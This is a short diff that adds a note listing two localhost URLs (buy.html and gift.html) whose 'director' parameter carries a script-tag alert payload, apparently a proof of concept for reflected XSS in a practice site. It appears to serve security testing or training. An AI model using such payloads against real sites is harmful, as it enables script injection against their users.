@@ -1,0 +1,4 @@
+Below mentioned links can be used to exploit XSS Vulnerability in teh site:
+
+http://127.0.0.1:8000/buy.html?director=<script>alert('XSS Vulnerability Found')</script>
+http://127.0.0.1:8000/gift.html?director=<script>alert('XSS Vulnerability Found')</script>
